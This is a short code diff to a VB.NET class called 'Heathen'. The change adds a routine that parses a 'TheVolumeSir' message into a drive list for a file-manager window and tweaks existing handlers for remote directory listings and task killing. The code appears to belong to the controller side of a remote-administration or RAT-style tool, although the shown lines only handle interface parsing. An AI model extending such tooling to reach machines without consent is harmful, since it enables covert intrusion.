@@ -215,7 +215,7 @@ Public Class Heathen
 
         ElseIf RichTextBox1.Text.Contains("StopAllAndSendItRightNow") Then
 
-            '      FMM.ListView1.Clear()
+            FMM.ListView1.Items.Clear()
             Dim getpath As String() = Split(RichTextBox1.Text, "StopAllAndSendItRightNow")
             Dim jk As String() = Split(getpath(0), "StopFilesNowDir")
             PathForFM = getpath(1)
@@ -241,8 +241,26 @@ Public Class Heathen
         ElseIf RichTextBox1.Text.EndsWith("fortaskkill") Then
 
             CheckKillTask(RichTextBox1.Text)
+
+        ElseIf RichTextBox1.Text.Contains("TheVolumeSir") Then
+            GetVol(RichTextBox1.Text)
         End If
 
+    End Sub
+    Public Sub GetVol(ByVal thevol As String)
+        Dim op As String = thevol.Replace("TheVolumeSir", "")
+
+        IO.File.WriteAllText("Vol.txt", op)
+
+        Dim k As String() = IO.File.ReadAllLines("Vol.txt")
+        For Each h In k
+            FMM.ComboBox1.Items.Add(h)
+        Next
+        Dim sk = FMM.Label3.Text(0) + FMM.Label3.Text(1) + FMM.Label3.Text(2)
+        FMM.ComboBox1.Text = sk
+        FMM.Show()
+
+        RichTextBox1.Text = String.Empty
     End Sub
     Public Sub CheckKillTask(ByVal h As String)
         If RichTextBox1.Text.Contains("Amazing") Then
@@ -329,7 +347,7 @@ Public Class Heathen
         IO.File.Delete("jk(0).txt")
         IO.File.Delete("jk(1).txt")
 
-
+        ''''''''Enabled.
         FMM.Show()
 
         RichTextBox1.Text = String.Empty
